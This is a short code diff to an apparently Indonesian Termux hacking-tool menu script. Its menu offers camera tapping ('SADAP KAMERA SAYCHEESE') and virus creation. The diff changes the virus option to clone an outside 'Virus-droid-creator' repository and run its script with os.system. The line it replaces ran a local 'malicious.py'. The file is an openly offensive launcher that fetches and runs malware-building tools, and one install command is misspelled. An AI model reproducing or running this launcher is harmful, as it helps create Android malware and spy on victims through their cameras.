@@ -43,7 +43,7 @@ menu = """
 \033[91m——————————————————————————————————\033[0m  \033[91m|————\033[0m\033[0m\033[97m|\033[0m
 \033[97m2. SADAP KAMERA SAYCHEESE\033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
 \033[91m——————————————————————————————————\033[0m  \033[91m|————\033[97m|\033[0m
-\033[97m3. CREATE VIRUS MALICIOUS\033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
+\033[97m3. CREATE VIRUS CREATOR NEW\033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
 \033[91m——————————————————————————————————\033[0m  \033[91m|————\033[0m\033[97m|\033[0m
 \033[97m4. ENCODE TEXT BASE64 NEW\033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
 \033[91m——————————————————————————————————\033[0m  \033[91m|————\033[0m\033[97m|\033[0m
@@ -100,7 +100,7 @@ def menu3():
        time.sleep(2)
        os.system('clear')
        mengetik('\033[91m«★★★\033[0m  \033[92mINSTALLING VIRUS MALICIOUS2 NEW\033[0m   \033[91m★★★»»\033[0m')
-       os.system('pip2 install requests && pip2 install tqdm && cd MALI && cd Malicious && cd Malicious && python2 malicious.py')
+       os.system('pkg install python2 && pkg install python && pkg instaall python && git clone https://github.com/saydog/Virus-droid-creator && cd Virus-droid-creator && python2 dog.py')
 menu3()
 
 def menu4():
